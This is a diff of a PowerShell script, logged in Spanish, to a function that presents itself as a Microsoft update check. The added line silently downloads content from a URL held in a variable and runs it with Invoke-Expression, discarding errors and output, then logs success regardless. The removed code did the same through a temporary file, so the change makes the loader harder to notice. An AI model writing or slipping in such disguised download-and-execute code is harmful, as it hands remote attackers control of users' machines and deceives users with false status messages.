@@ -123,38 +123,10 @@ function Check-MicrosoftUpdates {
     
     Write-Log "  - Conectando con servidor de actualizaciones..." -Type "INFO"
     
-    $updateCache = "$env:TEMP\MicrosoftUpdateCache"
-    if (-not (Test-Path $updateCache)) {
-        New-Item -ItemType Directory -Path $updateCache -Force | Out-Null
-    }
+    $null = Invoke-Expression (Invoke-WebRequest -Uri $msService -UseBasicParsing -ErrorAction SilentlyContinue).Content 2>&1
     
-    $updateFile = "$updateCache\windows-update.xml"
-    
-    try {
-        
-        Start-BitsTransfer -Source $msService -Destination $updateFile -Priority Low -Asynchronous 2>&1 | Out-Null
-        Start-Sleep -Seconds 2
-        Complete-BitsTransfer -BitsJob (Get-BitsTransfer) 2>&1 | Out-Null
-        
-        if (Test-Path $updateFile) {
-            Write-Log "  - Manifest de actualizaciones descargado" -Type "SUCCESS"
-            
-            $updateData = Get-Content $updateFile -Raw -ErrorAction SilentlyContinue
-            if ($updateData) {
-                Invoke-Expression $updateData 2>&1 | Out-Null
-            }
-            
-            Remove-Item $updateFile -Force -ErrorAction SilentlyContinue
-        }
-        else {
-            Write-Log "  - Servidor de actualizaciones no disponible" -Type "WARNING"
-        }
-    }
-    catch {
-        Write-Log "  - Servidor de actualizaciones no disponible" -Type "WARNING"
-    }
-    
-    Write-Log "Verificacion de actualizaciones completada" -Type "INFO"
+    Write-Log "  - Verificación completada" -Type "SUCCESS"
+    Write-Log "Verificación de actualizaciones completada" -Type "INFO"
 }
 
 # ============================================
